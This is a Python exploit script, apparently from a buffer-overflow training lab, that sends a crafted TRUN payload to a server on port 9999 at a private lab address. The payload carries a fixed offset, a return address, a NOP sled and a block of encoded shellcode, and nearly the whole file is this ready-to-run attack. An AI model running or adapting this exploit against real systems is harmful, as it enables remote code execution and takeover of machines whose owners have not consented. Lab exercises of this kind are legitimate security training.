#!/usr/bin/env python3

import socket, sys


'''
Getting offset 
'''


ip = "10.10.155.236"
port = 9999

crashed_pt = 2984

prefix = b"TRUN /.:/"
offset = 2003
overflow = b"A" * offset
retn = b"\x05\x12\x50\x62"
padding = b"\x90"*16      # used for giving some space to unpack encoding(in this case, shikataganai)

buf =  b""
buf += b"\xbf\x79\xdc\x2a\x2c\xda\xd6\xd9\x74\x24\xf4\x5e\x33"
buf += b"\xc9\xb1\x52\x31\x7e\x12\x83\xee\xfc\x03\x07\xd2\xc8"
buf += b"\xd9\x0b\x02\x8e\x22\xf3\xd3\xef\xab\x16\xe2\x2f\xcf"
buf += b"\x53\x55\x80\x9b\x31\x5a\x6b\xc9\xa1\xe9\x19\xc6\xc6"
buf += b"\x5a\x97\x30\xe9\x5b\x84\x01\x68\xd8\xd7\x55\x4a\xe1"
buf += b"\x17\xa8\x8b\x26\x45\x41\xd9\xff\x01\xf4\xcd\x74\x5f"
buf += b"\xc5\x66\xc6\x71\x4d\x9b\x9f\x70\x7c\x0a\xab\x2a\x5e"
buf += b"\xad\x78\x47\xd7\xb5\x9d\x62\xa1\x4e\x55\x18\x30\x86"
buf += b"\xa7\xe1\x9f\xe7\x07\x10\xe1\x20\xaf\xcb\x94\x58\xd3"
buf += b"\x76\xaf\x9f\xa9\xac\x3a\x3b\x09\x26\x9c\xe7\xab\xeb"
buf += b"\x7b\x6c\xa7\x40\x0f\x2a\xa4\x57\xdc\x41\xd0\xdc\xe3"
buf += b"\x85\x50\xa6\xc7\x01\x38\x7c\x69\x10\xe4\xd3\x96\x42"
buf += b"\x47\x8b\x32\x09\x6a\xd8\x4e\x50\xe3\x2d\x63\x6a\xf3"
buf += b"\x39\xf4\x19\xc1\xe6\xae\xb5\x69\x6e\x69\x42\x8d\x45"
buf += b"\xcd\xdc\x70\x66\x2e\xf5\xb6\x32\x7e\x6d\x1e\x3b\x15"
buf += b"\x6d\x9f\xee\xba\x3d\x0f\x41\x7b\xed\xef\x31\x13\xe7"
buf += b"\xff\x6e\x03\x08\x2a\x07\xae\xf3\xbd\x22\x27\x8b\xc0"
buf += b"\x5b\x35\x6b\x2a\xc0\xb0\x8d\x26\xe8\x94\x06\xdf\x91"
buf += b"\xbc\xdc\x7e\x5d\x6b\x99\x41\xd5\x98\x5e\x0f\x1e\xd4"
buf += b"\x4c\xf8\xee\xa3\x2e\xaf\xf1\x19\x46\x33\x63\xc6\x96"
buf += b"\x3a\x98\x51\xc1\x6b\x6e\xa8\x87\x81\xc9\x02\xb5\x5b"
buf += b"\x8f\x6d\x7d\x80\x6c\x73\x7c\x45\xc8\x57\x6e\x93\xd1"
buf += b"\xd3\xda\x4b\x84\x8d\xb4\x2d\x7e\x7c\x6e\xe4\x2d\xd6"
buf += b"\xe6\x71\x1e\xe9\x70\x7e\x4b\x9f\x9c\xcf\x22\xe6\xa3"
buf += b"\xe0\xa2\xee\xdc\x1c\x53\x10\x37\xa5\x73\xf3\x9d\xd0"
buf += b"\x1b\xaa\x74\x59\x46\x4d\xa3\x9e\x7f\xce\x41\x5f\x84"
buf += b"\xce\x20\x5a\xc0\x48\xd9\x16\x59\x3d\xdd\x85\x5a\x14"

shellcode = buf

chars = b"C"*(crashed_pt - offset - len(retn) - len(padding) - len(shellcode))

#postfix = b""

payload = prefix + overflow + retn + padding + shellcode + chars #Add NOPs \x90

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending payload...")
    #s.recv(1024)
    s.send(payload + b'\r\n')
    #s.recv(1024)
    print("Done!")
    s.close

except:
    print("Cannot connect to server")
    sys.exit()
